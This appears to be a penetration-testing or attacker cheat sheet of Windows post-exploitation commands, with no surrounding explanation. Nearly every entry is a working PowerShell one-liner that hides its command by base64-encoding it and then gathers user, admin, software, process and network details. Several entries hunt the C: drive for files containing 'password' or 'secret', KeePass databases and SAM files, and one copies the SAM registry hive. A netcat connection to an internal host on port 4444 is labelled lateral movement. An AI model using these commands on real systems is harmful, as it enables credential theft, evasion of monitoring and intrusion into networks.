## Lateral Movement:

- `nc 192.168.50.220 4444`

## Local Account Enumeration:

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'whoami'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\Current-User.txt"`

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'whoami /groups'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\Local-User-Groups.txt"`

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-LocalUser'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\Local-Users.txt"`

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-LocalGroupMember Administrators | Where-Object { $_.PrincipalSource -eq "Local" } | Select-Object Name'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\Local-Admins.txt"`

## Get Installed Applications:

### 32 Bit:

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,DisplayVersion'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\32BitPrograms.txt"`

### 64 Bit:

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,DisplayVersion'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\64BitPrograms.txt"`

## Local System Enumeration

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|secret" -SimpleMatch'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\Find-Secrets.txt"`

- `$folderPath = ".\Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-Process'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Campaign\Get-Process.txt"`

- `$command = "Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include SAM -File -Recurse -ErrorAction SilentlyContinue"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Get-ChildItem -Path C:\ -Include _.txt,_.ini -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'YourSearchString'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "Copy-Item -Path "$env:SystemRoot\System32\Config\RegBack\SAM" -Destination 'C:\Path\To\NewLocation\SAM'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "systeminfo"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "ipconfig /all"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "route print"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$command = "netstat -ano"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

`Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern 'password|secret' -SimpleMatch`
